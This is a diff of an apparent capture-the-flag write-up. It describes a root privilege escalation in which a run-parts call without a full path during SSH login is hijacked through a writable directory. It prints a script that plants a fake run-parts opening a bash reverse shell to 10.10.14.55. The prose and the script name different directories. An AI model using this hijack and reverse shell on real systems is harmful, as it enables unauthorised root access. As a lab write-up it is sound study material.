@@ -64,8 +64,23 @@ This cannot be used to log onto the CMS but can be used over `ssh` to give us th
 
 # ROOT
 
-Possibilities:
+It can be seen by viewing the processes that the command below is running when a user logs in via `ssh`.
 
->>> There is also a script called `fail2ban-server`
- 
->>> /bin/bash /usr/bin/mysqld_safe
+```
+sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+```
+
+`run-parts` is being executed without an exact location being specified.
+
+Alongside this, we have write access to `/usr/local/sbin/` this allows us to create a malicious `run-parts` to be executed when a user logs in.
+
+The malicious `run-parts` is below:
+
+```sh
+DIR="/usr/local/bin"
+
+echo "bash -c \"bash -i >& /dev/tcp/10.10.14.55/6868 0>&1\"" > $DIR/run-parts
+chmod +x $DIR/run-parts
+```
+
+This code executes a reverse shell as the context of root. This gives us a shell and allows us to view the `root.txt`.
